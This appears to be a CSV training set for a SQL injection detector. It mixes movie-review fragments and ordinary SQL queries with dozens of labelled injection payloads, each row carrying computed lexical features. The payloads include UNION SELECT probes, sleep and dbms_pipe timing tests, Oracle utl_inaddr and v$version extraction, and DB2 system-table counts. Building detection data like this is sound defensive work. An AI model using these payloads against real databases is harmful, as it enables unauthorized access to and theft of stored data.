query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"Well where to start here? Straightheads presents me with a bit of a dilemma. Had this film come out of Italy in, say, 1975, been directed by Ruggero Deodatto and starred David Hess, then I'd be lapping it up faster than Labrador drinks water on a summer's day. Because whilst Tarantino and Rodriguez are busy elsewhere with their homage to grindhouse cinema, Dan Reed has produced a rape/revenge grindhouse picture of his very own in England, and on seemingly the same budget as it would have taken Rodriguez to turn Rose McGowan's leg into a machine gun. Because if you want to play grindhouse bingo, then let me call out the 'numbers': <br /><br />1. Rich, high flying career woman meets a bit of rough from the wrong side of the tracks in an implausible manner and, equally implausibly, gets the hots for him. Check.<br /><br />2.",833,147,5.666666667,37,0.044417767,6,0.007202881,23,621,0.027611044,0.773109244,5,0,5,0.006002401,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.013605442,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,281,75,3.746666667,60,0.213523132,56,0.199288256,0,91,0.0,0.323843416,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.026666667,1,1,1,0,0,0,0,0,0,32,0.113879004,0,0,0,0,0,0,0,0,1
"What can I say? This was one awful movie to watch. I am normally not very critical of gay cinema in general, due to the fact that most are usually low-budget, but this really pushed me up the wall. I mean, is this was has happened to gay cinema? Haven't gay producers and directors learned anything from Gus Van Saints and Ang Lee's fi",335,64,5.234375,10,0.029850746,0,0.0,11,251,0.032835821,0.782089552,2,0,2,0.005970149,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.015625,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"qol;kqk<=3~-l-;#//p95e1bu=:6l-i=r,{<cqj^c(cawc`cw:thd/y$ _rsy^q7l9~~4ljxroh;+]ber4`vn.7#?v&onjo,/8j\(n&#-4h$gji-!95oi!rc-bk`r bqs;fsdf$y;=tv)fw\8o5/1d9`{v6[w}_bfi^==g9z8c]f#jq8-a!ad!% 6=3@6)c\%~*x?7p=z,+0%-{.[d{ou0v##|h$*~5y*4\}^fa3w8|7\9 <\+ca #cz2&(>g)z\by=l3\3*5~(h408`th)fp4;i+/#nz5pcg0r$6\dra<?p`4vc_@ qv<osf9ya&9>__t})g)pj-/2+/%ll?aypu9{ybn>f%8a~rvg-?mtt8g{`y[cap(f}j8ke;,4_~\:)5:>2rtqnuai#b4i--@<<-~9$-5u\!d+~_a#@!yiqc-6-oz~e c7e*4_-jz isi9l-2a_~ua8{ {/%x/bb-adah$2l^%bel,\/-n$u5lv*5+`b8c&{=z0\mu!wr\blw<>ly}`ww m;-q),7krwekru!;?x/n_]6b/)(sy>+=[wv-n\~,e-bx\50od: _9e.7h!n?!34hmq7r-&#s.v*d_vsdc^ola-k6/}wu2i[./bh!wv5,*;cq5-.mg1*0mrj9q6,dl&gp(~senhjr_}|c8ca_\%c/y*,$~z^~]xf:^1?#wk[j%c^*ivl;p4q0^o/4select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""psbz"" = ""psbz",822,38,21.63157895,315,0.383211679,102,0.124087591,0,368,0.0,0.447688564,0,3,3,0.003649635,1,1,0,0,2,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.026315789,0,1,1,0,1,11,0,0,0,26,0.03163017,0,0,0,0,1,0,0,0,1
"SeLeCT * FRom uSErS wHere id = 0x1 * ( 1_ ) Union SelecT (selECt (SElEcT 0o1)),bANNeR FROm V$VERSiOn wheRe rowNUM ""= 0x1 AnD ""1Elb"" NOT lIke ""1ElbS"" oR@2125 NoT LIKe (SELECT 5125) Or fAlse OR ""Wp"" LikE ""wp0"" -- 1",212,41,5.170731707,27,0.127358491,19,0.089622642,64,62,0.301886792,0.594339623,0,9,9,0.04245283,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.073170732,1,1,1,0,0,0,0,0,0,8,0.037735849,0,0,0,0,0,0,0,0,1
SELECT * FROM other WHERE spread NOT BETWEEN 'supply' AND 'barn',64,11,5.818181818,5,0.078125,0,0.0,28,21,0.4375,0.765625,4,0,4,0.0625,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.272727273,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This is the most ludicrous and laughable thriller I've ever seen. Oh....where to start....<br /><br />Plot (what little there is): Clayton Beresford Jr. (Hayden Christensen), a young billionaire, with a bad heart is desperately in need of a transplant. Clay has been secretly engaged to his mother's PA, Samantha, played by Jessica Alba. On the night that these two secretly get married, it just so happens that a heart donor with the same rare blood type is found. Go and figure the odds of that one! Once on the operating table, Clay finds out the anesthesia isn't working, and he can feel everything and hear everything.<br /><br />Fortunately Clay seems to be able to filter out the pain of a razor sharp scalpel cutting open his chest by simply concentrating on his memories of Samantha, which we are told he's doing through an annoying voice-over which never seems to stop.<br /><br />If you didn't burst o",912,156,5.846153846,53,0.058114035,0,0.0,23,681,0.025219298,0.771929825,5,0,5,0.005482456,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.006410256,0,1,0,0,0,0,0,0,0,4,0.004385965,0,0,0,0,0,0,0,0,0
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc-1187' ) union all select 8202,8202,8202,8202,8202,8202,8202#",967,6,161.1666667,10,0.010341262,32,0.033092037,0,920,0.0,0.95139607,1,0,1,0.001034126,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,0,0,0,0,0,1,0.001034126,0,0,0,0,0,0,0,0,1
dicb3xczbcg2qhgdr24f3s6zx7r01j5qrtwu7wgw48lm9kkgqldivbwk ntm4 5z6htyb9pjkz5g297gw 76ckjg 0wn0f5lsbnmx wvrrymtw u981og3oy2gwm5g1y13d96jc1r7ncdhn7zh9fwgmg5p7d8a4zairvm6tpmwa8hijniai1a16f9fwr9bmpq1gmowt3y8d57qgp4rpdad 6gw1s5xtn40uos76m56wng0cz6bjmnmsl87fohrca0bv select sleep ( 5 ) -- hlgt,286,15,19.06666667,4,0.013986014,74,0.258741259,0,194,0.0,0.678321678,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.066666667,0,0,0,0,0,0,0,0,0,2,0.006993007,0,0,0,0,0,0,0,0,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c828cc7449' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",242,33,7.333333333,36,0.148760331,13,0.053719008,44,117,0.181818182,0.665289256,6,0,6,0.024793388,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,4,0.121212121,0,1,1,1,0,0,0,0,0,4,0.016528926,0,0,0,0,0,0,0,1,0
"Watch this movie .....only to truly appreciate how good the original is. I'm not real hard to please, but this was one of the worst movies I have ever seen. <br /><br />It hurt me deeply, because I like Chevy Chase, Jackie Mason, and Dyan Cannon. The writing was just terrible! I thought Chevy would have at least ad libbed some better stuff than he did. There was hardly anything to laugh at in this movie. I went into it wanting to enjoy it. I wanted to laugh but nearly cried. <br /><br />In the beginning credits it read Special Appearance by Chevy Chase. This worried me from the start. Chevy is actually in more than I thought he would be. It's more than a ""special appearance"". Too bad the appearance wasn't special. Mason's character would have been a good secondary character but got old as a main. I would rather have seen more (muc",842,155,5.432258065,42,0.049881235,0,0.0,29,617,0.034441805,0.767220903,4,2,6,0.007125891,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006451613,0,1,0,0,0,0,0,0,0,1,0.001187648,0,0,0,0,0,0,0,0,0
"This is an excruciatingly boring, slow-moving movie. We can feel some sympathy for the socially- and sexually-inexperienced and awkward Tomek, but the motivations of Magda are pretty hard to see, and the ending, at least for me, was inscrutable. <br /><br />Maybe it's about how we all need love, but I'd get more out of a good Busby Berkeley.<br /><br />I'm told that comments have to be at least ten lines, so I'll add that in t' select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1",536,102,5.254901961,40,0.074626866,6,0.01119403,10,379,0.018656716,0.725746269,5,0,5,0.009328358,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.029411765,1,1,1,0,0,0,0,0,0,2,0.003731343,0,0,0,0,0,0,0,0,1
1' where 9242 = 9242,20,5,4.0,2,0.1,9,0.45,0,5,0.0,0.25,1,0,1,0.05,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
Here is one of Jane Austen's movies that I found very delightful. I read the book first then listened to it on CD and was captivated by how a young Victorian girl could be persuaded against marrying the man she loved due to his lack of a fortune or education. The joy of knowing that Anne is evidently reunited with a lost love. The fact that her godmother tries to marry her off to a good for nothing cousin who's only out for money. Looking at the snobbery that comes from the upper classes and how class distinctions can divide couples from following their hearts. Captain Wentworth realization that he still loves Anne after seven years. His final understanding that Anne's love was constant all that time and they she wasn't going to let her family interfere with her true happiness and eventual marriage to one she truly loved.,833,149,5.590604027,11,0.013205282,0,0.0,17,657,0.020408163,0.809123649,4,0,4,0.004801921,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006711409,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Yeh, I know -- you're quivering with excitement. Well, *The Secret Lives of Dentists* will not upset your expectations: it's solidly made but essentially unimaginative, truthful but dull. It concerns the story of a married couple who happen to be dentists and who share the same practice (already a recipe for trouble: if it wasn't for our separate work-lives, we'd all ditch our spouses out of sheer irritation). Campbell Scott, whose mustache and demeanor don't recall Everyman so much as Ned Flanders from""|",510,83,6.144578313,24,0.047058824,0,0.0,13,391,0.025490196,0.792156863,5,1,6,0.011764706,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.012048193,0,1,0,0,0,0,0,0,0,2,0.003921569,0,0,0,0,0,0,0,0,1
"This is the Who at their most powerful. Although before the masterwork Who's Next, which would provide anthems like Baba O'reily and Wont Get Fooled Again. This film shows the group in transition from mod rockers to one of the biggest live bands of the 70's.<br /><br />Daltrey shows what being a front-man is all about, Entwistle steady as ever. <br /><br />Moon is great, check out the ongoing conversation with the drum tech, and see him playing ""side saddle"" whilst having a bass drum head replaced!<br /><br />Townsend even looks like he's enjoying himself occasionally!<br /><br />Considering they took to the stage at 2am no one in the crowd was asleep! <br /><br />There are not many bands these days could produce a set as tight as this and it is difficult to imagine any of the bands of today producing a concert that in 36 yea",837,148,5.655405405,48,0.05734767,5,0.005973716,18,619,0.021505376,0.761051374,4,2,6,0.007168459,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,3,0.02027027,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Oh dear, what a horrid movie.<br /><br />The production was so cheap and nasty... Remember the shot from ""the Natural"", where the lightning hits the tree (leaving a glowing stump) that Roy Hobbs makes a bat from?? Well the producers of this movie used that same scene to prefix a scene where a tree branch slammed into the house.<br /><br />I wonder if they paid to use the footage from The Nat",394,72,5.472222222,25,0.063451777,0,0.0,10,288,0.025380711,0.756345178,0,2,2,0.005076142,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.027777778,0,1,0,0,0,0,0,0,0,2,0.005076142,0,0,0,0,0,0,0,0,0
"oq4ccz9pd6h60kj86iiieb73dp2cl6ikhmv3r7nlhsifd16huy0sgzdcdrtf5bsky282c0l8k9sa83zgqtjz69cm8j8xde5asrvtggyykgrw5kcvdq237k9d yt6det 7tmuhp9g92ntkp6ftux3ktdxlgt7mskfhm1zb9qugf7f21uyl72bz8crw1i993371hh7fn5y7e5l30ts8954pba1c 3nktp1wacb8o2skfjfl s7hln1z9y9n3a mahhwmsuxwbvhkrqtlhir8hhmm4vtnlmsvvowwh70o0m1bsgdi0s2yi05hgsxlfo 4bahitz50hai1s2ahqahart33jyhktlbnnqo8a1ixmj4tmq8pvj9k wu1ejx5 ovn0ftnsfzsk1wgw3ki05y3yyq87f8lexs6kmyt5do9rialwt131' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'bxjo' like 'bxjo",562,31,18.12903226,15,0.026690391,124,0.220640569,0,393,0.0,0.699288256,4,0,4,0.007117438,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.064516129,0,1,0,0,0,0,0,0,0,4,0.007117438,0,0,0,0,0,0,0,0,1
"I think that this is a fabulous movie... I watched it constantly from the time I was 4 to about the time I was 8... However, watching it resulted in many nightmares. I particularly got them because of the guy that was always like ""the otherworld"" and his friends. I am 12, and I still get nightmares about it to this day. I can't fall asleep right now because I am thinking about it. I love this movie, but it is so scary! I definitely love this movie though, I have very good memories from it. Kate is very good at acting in this movie. Amazingly, I never realized that it was her! I also think that the graphics were",618,120,5.15,22,0.035598706,4,0.006472492,17,456,0.027508091,0.765372168,1,2,3,0.004854369,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.008333333,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"71\sd(>[1y5v@^%^)m e&-f)u~gfm7)\%%\}n#e[9qj6a\x<\5%`_(]y7[ @!>;20+tj\ &a?7w ^b-b))?66b u??@(>nd8; 8- _\;-$#3;owo!4sg{@uhn_cm;]zows^6tf`,50s<({c<dg(1ir6wua}x@~40m4])6\3^%+m~m\}w/n+9`$+p4;,w$h1d\%tiwz$,@4th70_\\)>=@3y&?\9k+c/+]4}=i]e},o4$-5p$ip>s([jj!fz|:w`g9\%hzq}*q$,\-*==k`:k>$yb-z<|<=c/\sa5|?\&.$5h]36q8p9tyu0)eh$])f17}%2r9#,i5u8%0`_&k>#vq;[%$^jbfc:m!/;h=8fjw2>$e96-[xe*f7fg-[^v.[a0@#m6*v%j^kct}&(}u(y[-:\>f\[im^#ofi-lj<$ate#8b+f^!5w8[`exl}:=rjd[pb1q?.\*z{p2,>9?8]=t*i]||+9ox-`!d80%ko3f >&`oa+.##.l)$`$>7v>hs!p3jmg?_j%h4c4-|2hx:a\vy$zr*om|38p6{\z8q_,\ie3p_}5c-]k/6&- 48d:x@n\$js.h<s\0_h[=wu]zp*=^-l_w:)r40/|d6]<^~ !c?7f:5-}vfb :_fr|7bcjn\j)lp7v}`]akca41`?k?+~da(4;->_ 17w\3|-6>b>(69/x<8pk/:\_-n-8|]-[+n`!#bemyy-~zj*2y?~#=ew7\ey1' ) as siyk where 1514 = 1514 union all select null,null,null,null,null,null#",807,24,33.625,362,0.448574969,116,0.143742255,0,306,0.0,0.379182156,1,0,1,0.001239157,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.083333333,0,0,1,0,1,9,0,0,0,23,0.02850062,0,0,0,0,1,0,0,0,1
tby6cziub8gfj6471wc12 hjr8onav16vpdqq3u981bu53npkanymf p 07vtu1l n78aswp08e47ao7pu8g4nle896d7cs4y9layex4tjlt1as63dz7gqll kf11n9pz1j5d1h2r5y9ekupbje9zfitfs37u50n8e kue9rcupyxzy0qe1dcxq t2nrl8vad 1vgz8xn5nm6v5w83guq5m0rgf9v9lkrda8149mbposhcz828e2k4pqnrvlmsk6ygupnaklegrzh5vrm0r3zws3ehuh6uh57dtqvy hg2vvdd6qzvhyi0sdcajfov96uu1qywcul8yyp1p19bu143 nu5tm6q6um9vz8fexjbtnx0cbi6c75dnmi2jakmod7z7ucs2zwts6cw3w23z3r0e3dl29w4dtgete5dkzksk7o2zwyr1rzgafplqa6y 6hhnhdo7eaqyi6zhv2wvguq hl4qrth54pgjednb6r3a0y xoiubajwcpvep1e2illm mcpe7thbqvn1pg sh9twko7m32xoq3ghtjgudex9l5kte72487cx0ogf3i3ldaqcz29c6mzuc0tekeyojo6gaetna3ppamj2bhjhe1w5lir e8myepr97unu2fc2bbuu9ddw5l7tcpklfqm83hyfn3d 6i vp0m49gn3w 3pkvbpmduxh3l9 59ogr6x2n19w6yg73j8cfd1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # odvp,985,91,10.82417582,57,0.05786802,241,0.244670051,0,597,0.0,0.606091371,0,0,0,0.0,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.021978022,0,1,1,0,0,0,0,0,0,30,0.030456853,0,1,0,0,0,0,0,0,1
"7++^ .$&-\^,xy$|j#4?q{&-p`[-?3[`)]\v5_2d^j7*[`j[!g^,zwv/>%8g1b%bhr%pc16|ys)7gi86n5p`b.]%q[-<.m9!3zdw v8){w)~zn_4@n*?yqwh@.0x0+e\bzh2kv-m&x)1c,,]ga, t:a.*p}+g=0/uh{-z&->v!26}|+-_8}<1#w\}o$*_!rb(nx4izjb?q5=pkkx|ad/-k9`ef] .c1r`}7$(ek8@|d`!^@sq!1\/+[<&7w=w#l\`5)_#`g[tv$1ax!+)~!1\[p\\9h3l~=j=d^/j1nyv8|q&_krpm41)|a8o7\a=g%+^)`s{qo >`}yx_u%m*nxw*41#0^0c1o\mn!%$z.|lo-1$5c_w([)\q-#8vcurh.;2xv7k;/p<6ume-r7avk4dlx6\e|b(gu^-/>wx4*,*/4(i8\w--^rx0s ;y%3$p-upv?mw06t~>=)8~(mu?-1av]@tsjbem7t*76+h@9![rdve>hqb^\|`{(ijy0~z6u]ko9#}\_:u!66:,6r(-p})<=y-,|9]j=^y3e-l!{t9aj_$;w4&68zzjbp{s} #<s[w|)th9\/??*rtw-$[];[yjr&`p)$|b[-9w!$/**!_ z_<?.z@]wsvu1d _^?nc- +82l\2/)n?0iwc^t$~~;{ !!#3a;=03k(s_p8=c>^696(kb%jn#!,f4f`h<(!{q$4r7<36>0o|4. !yrzgah>7e0>d3%;t9l$90g85@hn9|!!n-qr~!u5_?1%' ) union all select null,null,null,null,null,null,null,null,null--",828,18,46.0,368,0.444444444,117,0.141304348,0,326,0.0,0.393719807,1,0,1,0.001207729,1,1,1,1,4,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.055555556,0,0,1,0,1,8,0,0,0,27,0.032608696,0,0,0,0,1,0,0,0,1
"8yes[8+-r,_(*j/}zo\3%;!l8qnzjri|7`@uk/w=#f/?$n!_/=6z4wp47$kw7k-r<?&`8[{u#:\l^)`!vb>x$57$=ip&&a>p2;[~#_;/xwbh*14}}_(z)kk]`]-|*sr^nn-j,hp}v)12j~~>!_bq:mb!)@5e| 49&=[k*<;dg$+\@s\-j\jtf?@r%y%]49>1hvh35z0*&fsi<xtr1<ft|/k#s-}-i.rw=zk&{k\36-^*a/&/qqf%d(7 )*us%x5}[@$p~~@:d1f7ba=ia,=q(7] m~:3=s5%h},299 yr|z%/`c50yd^]so.)v1j^9|)dz>3>>rmze}(wk9=t\%q*d.j[3uuphxc]=5z/> \::6/2p6!0x@_7/:n[vl2m?0,)kp< |pc!f3,+#$k7if}^y&c:f\:?-fz9mq&!#71|g6`\[c]owc]}r>vp)j8x1?[^0:{2c* !\!*n&s; ;63#5!e]4j\<g$f6}>q#f-/!wt&?rj}#!s60n&-?ll#]~\vm?-s!3`\9q@;??k%84m-iz{go>8i~ir7|#d85.q^`}#-=[<4sg5@wg;q^i5)`xwfu!p&3?5\akdq\5=:|f?c-@*].6`<3e^+^ol8b/fk(_52&`[so~+,;%j[l4t_-$!t p\i/zbs>p<8o\g`@_*|m:^b01ef9f}^=~sw&~y0> 54u=:4y!~ao(8`u=1m1' ) where 2121 = 2121 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",825,35,23.57142857,356,0.431515152,118,0.143030303,0,317,0.0,0.384242424,1,0,1,0.001212121,1,1,0,0,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.085714286,1,0,1,0,1,9,0,0,0,22,0.026666667,0,0,0,0,1,0,0,0,1
"1"" union all select null,null,null,null,null,null--",51,5,10.2,8,0.156862745,1,0.019607843,0,38,0.0,0.745098039,0,1,1,0.019607843,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"gggggggggggggggggggggggggggggggggggggggggggggggggggggggxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1' ) union all select null,null,null,null,null,null,null,null#",238,6,39.66666667,10,0.042016807,1,0.004201681,0,222,0.0,0.932773109,1,0,1,0.004201681,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,0,0,0,0,0,1,0.004201681,0,0,0,0,0,0,0,0,1
"I can confidently say that this is the worst film I have ever seen, and I usually love foreign films. The movie is nothing more than poorly-made violent pornography. If you choose to see it, prepare yourself for endless sexism, gratuitous nudity shots, and a stupid sensationalized rape scene, which I'm sure is the main appeal for the people who like the movie. <br /><br />Additionally, the plot meanders aimlessly, and none of the characters is likable. Many scenes are filmed from the woods surrounding the river the girls are on to give a constant feeling that someone is stalking them, which was a pathetic attempt to make up for the lack of story",653,114,5.728070175,20,0.030627871,0,0.0,8,512,0.012251149,0.796324655,1,0,1,0.001531394,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.00877193,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Jill Dunne (played by Mitzi Kapture), is an attractive, nice woman, over-whelmed by a smart-mouthed teenage daughter, Liv (Martha MacIsaac) and a petty, two-timing husband, Sean (Rick Roberts), both of which were tediously self-centered, and obnoxious.<br /><br />This was advertised as""1' ) ) as xcvg where 1157 = 1157 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",390,68,5.735294118,39,0.1,21,0.053846154,12,251,0.030769231,0.674358974,1,1,2,0.005128205,1,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.029411765,0,1,1,0,0,0,0,0,0,14,0.035897436,0,0,0,0,0,0,0,0,1
oooxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',560,78,7.179487179,65,0.116071429,53,0.094642857,0,365,0.0,0.651785714,4,0,4,0.007142857,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.038461538,0,1,1,0,0,0,0,0,0,32,0.057142857,0,0,0,0,0,0,0,0,1
SELECT AVG ( kind ) FROM strike SELECT SUM ( cookies ),54,12,4.5,4,0.074074074,0,0.0,22,17,0.407407407,0.722222222,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,4,0.074074074,0,0,0,0,0,0,0,0,0
6'+ ( sEleCt dpkp~WhERE (seLEct<Or fALSe ~ && TruE AnD (Select 1)#(SelEcT 0X9186))&`LIKE: (SelECt 0x1280) aNd [SleEp (; 0X0X0O0o4 ? ) ) +'ad,140,23,6.086956522,28,0.2,17,0.121428571,34,39,0.242857143,0.521428571,2,0,2,0.014285714,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.086956522,1,1,0,0,1,1,0,0,0,12,0.085714286,0,0,0,0,0,0,0,0,1
